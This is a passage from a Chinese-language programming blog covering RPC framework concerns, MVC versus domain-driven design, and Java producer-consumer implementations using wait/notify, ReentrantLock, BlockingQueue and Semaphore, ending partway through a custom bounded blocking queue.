这时候就需要一个服务注册中心，从服务注册中心获取服务的实例列表，再从中选择一个进行调用。</li><li><code>负载均衡</code> 选哪个调用好呢？这时候就需要负载均衡了，于是又得考虑如何实现复杂均衡</li><li><code>缓存</code> 总不能每次调用时都去注册中心查询实例列表吧，这样效率多低呀，于是又有了缓存，有了缓存，就要考虑缓存的更新问题</li><li><code>异步调用</code> 客户端总不能每次调用完都干等着服务端返回数据吧,于是就要支持异步调用;<ul><li>Future实现</li></ul></li><li><code>版本控制</code> 服务端的接口修改了，老的接口还有人在用，怎么办？总不能让他们都改了吧？这就需要版本控制了；</li><li><code>线程池</code> 服务端总不能每次接到请求都马上启动一个线程去处理吧？于是就需要线程池；</li><li><code>未处理完的请求</code> 服务端关闭时，还没处理完的请求怎么办？是直接结束呢，还是等全部请求处理完再关闭呢？</li></ol><h2 id="什么是DDD？"><a href="#什么是DDD？" class="headerlink" title="什么是DDD？"></a>什么是DDD？</h2><h3 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h3><p>要说DDD，不得不先看看MVC，我相信基本上99%的java开发读者，不管你是计科专业出身还是跨专业，初学spring或者springboot的时候，接触到的代码分层都是MVC<br>这说明了MVC有它自身独有的优势：</p><ul><li>开发人员可以只关注整个结构中的其中某一层；</li><li>可以很容易的用新的实现来替换原有层次的实现；</li><li>可以降低层与层之间的依赖；</li><li>有利于标准化；</li><li>利于各层逻辑的复用。</li></ul><p>但是真实情况是这样吗？随着你系统功能迭代，业务逻辑越来越复杂之后。MVC三层中，V层作为数据载体，C层作为逻辑路由都是很薄的一层，大量的代码都堆积在了M层（模型层）。一个service的类，动辄几百上千行，大的甚至几万行，逻辑嵌套复杂，主业务逻辑不清晰。service做的稍微轻量化一点的，代码就像是胶水，把数据库执行逻辑与控制返回给前端的逻辑胶在一起，主次不清晰。<br>一看你的工程，类啊，代码量啊都不少，你甚至不知道如何入手去修改“屎山”一样的代码。</p><h3 id="那么DDD为什么可以去解决以上的问题呢？"><a href="#那么DDD为什么可以去解决以上的问题呢？" class="headerlink" title="那么DDD为什么可以去解决以上的问题呢？"></a>那么DDD为什么可以去解决以上的问题呢？</h3><p>DDD核心思想是什么呢？解耦！让业务不是像炒大锅饭一样混在一起，而是一道道工序复杂的美食，都有他们自己独立的做法。</p><p>DDD的价值观里面，任何业务都是某个业务领域模型的职责体现。A领域只会去做A领域的事情，A领域想去修改B领域，需要找中介（防腐层）去对B领域完成操作。我想完成一个很长的业务逻辑动作，在划分好业务边界之后，交给业务服务的编排者（应用服务）去组织业务模型（聚合）完成逻辑。</p><p>这样，每个服务（领域）只会做自己业务边界内的事情，最小细粒度的去定义需求的实现。原先空空的贫血模型摇身一变变成了充血模型。原理冗长的service里面类似到处set，get值这种与业务逻辑无关的数据载体包装代码，都会被去除，进到应用服务层，你的代码就是你的业务逻辑。逻辑清晰，可维护性高！</p><h3 id="什么样的系统适配DDD"><a href="#什么样的系统适配DDD" class="headerlink" title="什么样的系统适配DDD"></a>什么样的系统适配DDD</h3><p>中小规模的系统，本身业务体量小，功能单一，选择mvc架构无疑是最好的。 项目化交付的系统，研发周期短，一天到晚按照甲方的需求定制功能。</p><p>中大规模系统，产品化模式，业务可持续迭代，可预见的业务逻辑复杂性的系统。</p><h3 id="DDD的代码怎么做"><a href="#DDD的代码怎么做" class="headerlink" title="DDD的代码怎么做"></a>DDD的代码怎么做</h3><p>&#x2F;&#x2F; TODO</p><h2 id="Java实现生产者消费者"><a href="#Java实现生产者消费者" class="headerlink" title="Java实现生产者消费者"></a>Java实现生产者消费者</h2><h3 id="wait-和notify-方法的实现"><a href="#wait-和notify-方法的实现" class="headerlink" title="wait()和notify()方法的实现"></a>wait()和notify()方法的实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Integer</span> <span class="variable">FULL</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">LOCK</span> <span class="operator">=</span> <span class="string">&quot;lock&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Test1</span> <span class="variable">test1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test1</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test1.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test1.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test1.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test1.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test1.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test1.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test1.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test1.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (LOCK) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (count == FULL) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            LOCK.wait();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    count++;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;生产者生产，目前总共有&quot;</span> + count);</span><br><span class="line">                    LOCK.notifyAll();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Consumer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (LOCK) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            LOCK.wait();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    count--;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;消费者消费，目前总共有&quot;</span> + count);</span><br><span class="line">                    LOCK.notifyAll();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="可重入锁ReentrantLock的实现"><a href="#可重入锁ReentrantLock的实现" class="headerlink" title="可重入锁ReentrantLock的实现"></a>可重入锁ReentrantLock的实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Integer</span> <span class="variable">FULL</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="comment">//创建一个锁对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="comment">//创建两个条件变量，一个为缓冲区非满，一个为缓冲区非空</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Condition</span> <span class="variable">notFull</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Condition</span> <span class="variable">notEmpty</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Test2</span> <span class="variable">test2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test2</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test2.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test2.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test2.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test2.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test2.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test2.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test2.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test2.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//获取锁</span></span><br><span class="line">                lock.lock();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> (count == FULL) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            notFull.await();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    count++;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()</span><br><span class="line">                            + <span class="string">&quot;生产者生产，目前总共有&quot;</span> + count);</span><br><span class="line">                    <span class="comment">//唤醒消费者</span></span><br><span class="line">                    notEmpty.signal();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="comment">//释放锁</span></span><br><span class="line">                    lock.unlock();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Consumer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e1) &#123;</span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                lock.lock();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            notEmpty.await();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    count--;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()</span><br><span class="line">                            + <span class="string">&quot;消费者消费，目前总共有&quot;</span> + count);</span><br><span class="line">                    notFull.signal();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    lock.unlock();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="阻塞队列BlockingQueue的实现"><a href="#阻塞队列BlockingQueue的实现" class="headerlink" title="阻塞队列BlockingQueue的实现"></a>阻塞队列BlockingQueue的实现</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test3</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//创建一个阻塞队列</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">BlockingQueue</span> <span class="variable">blockingQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Test3</span> <span class="variable">test3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test3</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test3.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test3.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test3.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test3.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test3.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test3.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test3.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test3.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    blockingQueue.put(<span class="number">1</span>);</span><br><span class="line">                    count++;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()</span><br><span class="line">                            + <span class="string">&quot;生产者生产，目前总共有&quot;</span> + count);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Consumer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e1) &#123;</span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    blockingQueue.take();</span><br><span class="line">                    count--;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()</span><br><span class="line">                            + <span class="string">&quot;消费者消费，目前总共有&quot;</span> + count);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="信号量Semaphore的实现"><a href="#信号量Semaphore的实现" class="headerlink" title="信号量Semaphore的实现"></a>信号量Semaphore的实现</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test4</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//创建三个信号量</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Semaphore</span> <span class="variable">notFull</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Semaphore</span> <span class="variable">notEmpty</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Semaphore</span> <span class="variable">mutex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Test4</span> <span class="variable">test4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test4</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test4.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test4.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test4.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test4.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test4.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test4.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test4.<span class="keyword">new</span> <span class="title class_">Producer</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(test4.<span class="keyword">new</span> <span class="title class_">Consumer</span>()).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    notFull.acquire();</span><br><span class="line">                    mutex.acquire();</span><br><span class="line">                    count++;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()</span><br><span class="line">                            + <span class="string">&quot;生产者生产，目前总共有&quot;</span> + count);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    mutex.release();</span><br><span class="line">                    notEmpty.release();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Consumer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e1) &#123;</span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    notEmpty.acquire();</span><br><span class="line">                    mutex.acquire();</span><br><span class="line">                    count--;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()</span><br><span class="line">                            + <span class="string">&quot;消费者消费，目前总共有&quot;</span> + count);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    mutex.release();</span><br><span class="line">                    notFull.release();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Java实现BlockQueue"><a href="#Java实现BlockQueue" class="headerlink" title="Java实现BlockQueue"></a>Java实现BlockQueue</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BlockingQueue</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 有界队列内部固定长度，因此可以用数组实现</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Object[] elements;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 队列的头和尾下标</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">head</span> <span class="operator">=</span> <span class="number">0</span>, tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 队列目前的长度</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Condition</span> <span class="variable">notEmpty</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Condition</span> <span class="variable">notFull</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BlockingQueue</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.elements = <span class="keyword">new</span> <span class="title class_">Object</span>[capacity];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (size == elements.length)</span><br><span class="line">                notFull.await();</span><br><span class="line">            elements[tail] = e;</span><br><span class="line">            <span class="keyword">if</span> (++tail == elements.length) &#123;</span><br><span class="line">                tail = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            size++;</span><br><span class="line">            notEmpty.signal();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">take</span><span class="params">()</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">                notEmpty.await();</span><br><span class="line">            &#125;</span><br><span class="line">            e = (E) elements[head];</span><br><span class="line">            elements[head] = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (++head == elements.length)</span><br><span class="line">                head = <span class="number">0</span>;</span><br><span class="line">            size--;</span><br><span class="line">            notFull.signal();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> size;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            